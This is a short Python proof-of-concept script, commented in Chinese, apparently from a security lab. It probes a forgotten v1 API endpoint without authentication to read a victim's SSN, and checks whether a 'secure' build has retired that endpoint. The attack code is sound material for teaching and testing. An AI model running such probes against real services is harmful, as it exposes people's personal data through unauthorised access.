"""舊版 API 探測攻擊腳本:不用登入,直接走被遺忘的 v1 端點拿受害者的敏感資料。

同一支腳本打 vulnerable 與 secure 兩版,靠 v1 的回應證明漏洞是否成立:
- vulnerable:v1 還活著且無認證 → 未登入就讀到 ssn → 舊版本成了破口。
- secure:v1 已退役(410 Gone)→ 攻擊者被迫走要認證的 v2 → 攻擊失敗。
"""

import requests

VICTIM_ID = 2
REQUEST_TIMEOUT_SECONDS = 5


def run_shadow_api_attack(base_url):
    """回傳 (是否洩漏, 說明字串)。是否洩漏=True 代表漏洞成立。"""
    # 先確認目前版本 v2 是有防護的(未帶令牌應被擋)——凸顯破口只在舊版 v1。
    v2 = requests.get(
        f"{base_url}/api/v2/users/{VICTIM_ID}",
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    v2_note = "v2 需認證(未登入被擋)" if v2.status_code == 401 else f"v2 status={v2.status_code}"

    # 攻擊:改走沒人管的舊版 v1,完全不帶令牌。
    v1 = requests.get(
        f"{base_url}/api/v1/users/{VICTIM_ID}",
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if v1.status_code == 200 and "ssn" in v1.json():
        leaked = v1.json()["ssn"]
        return True, f"走舊版 v1 未登入就讀到 Bob 的 ssn = {leaked}({v2_note})"
    if v1.status_code == 410:
        return False, f"舊版 v1 已退役(410 Gone),無法繞過({v2_note})"
    return False, f"v1 未洩漏(status={v1.status_code},{v2_note})"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5091"
    leaked, message = run_shadow_api_attack(target)
    print(("[漏洞成立] " if leaked else "[已防禦] ") + message)
